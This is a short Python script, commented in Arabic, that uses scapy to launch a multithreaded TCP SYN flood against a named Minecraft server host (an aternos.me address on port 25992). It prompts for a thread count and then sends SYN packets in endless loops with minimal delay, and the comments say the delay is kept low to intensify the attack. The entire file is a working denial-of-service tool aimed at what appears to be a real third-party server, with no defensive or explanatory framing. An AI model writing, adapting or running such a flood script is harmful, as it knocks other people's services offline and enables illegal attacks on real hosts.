import random
import time
from scapy.all import *
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

# تفعيل دعم الألوان في الطرفية
init(autoreset=True)

target_ip = "FronzCraftS3.aternos.me"
target_port = 25992

# طلب من المستخدم إدخال عدد الخيوط والتحقق من الإدخال
while True:
    try:
        threads_count = int(input(Fore.GREEN + "Threads: "))  # إدخال عدد الخيوط من المستخدم
        if threads_count <= 0:
            print(Fore.RED + "يرجى إدخال عدد خيوط أكبر من 0.")
            continue
        break
    except ValueError:
        print(Fore.RED + "الرجاء إدخال عدد صحيح.")

def attack():
    while True:
        ip = IP(dst=target_ip)  # تحديد عنوان الـ IP الهدف
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")  # إعداد حزمة TCP مع العلم SYN
        
        # لا حاجة إلى payload مع هذا النوع من الهجمات، نترك الحزمة فارغة
        packet = ip / tcp

        # إرسال الحزمة إلى الهدف
        send(packet, verbose=False)

        # تقليل التأخير بين إرسال الحزم لزيادة كثافة الهجوم
        time.sleep(0.001)  # تأخير منخفض لزيادة الكثافة

# استخدام ThreadPoolExecutor لإدارة الخيوط بشكل أفضل
with ThreadPoolExecutor(max_workers=threads_count) as executor:
    for _ in range(threads_count):
        executor.submit(attack)